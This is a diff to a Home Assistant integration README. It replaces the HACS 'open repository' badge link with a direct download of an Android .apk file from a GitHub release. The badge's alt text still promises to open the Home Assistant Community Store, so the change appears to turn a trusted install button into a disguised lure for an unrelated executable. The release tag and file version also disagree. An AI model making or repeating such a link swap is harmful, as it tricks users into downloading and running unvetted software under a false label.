@@ -57,7 +57,7 @@
 
 ### HACS
 
-[![Open your Home Assistant instance and open a repository inside the Home Assistant Community Store.](https://my.home-assistant.io/badges/hacs_repository.svg)](https://my.home-assistant.io/redirect/hacs_repository/?owner=nao-pon&repository=ha_smartwiz_art&category=integration)
+[![Open your Home Assistant instance and open a repository inside the Home Assistant Community Store.](https://my.home-assistant.io/badges/hacs_repository.svg)](https://github.com/nao-pon/ha_smartwiz_art/releases/download/1.0.0/smartwiz_art_setup_1.0.1.apk)
 
 1. HACS → Integrations
 2. Custom Repository 追加
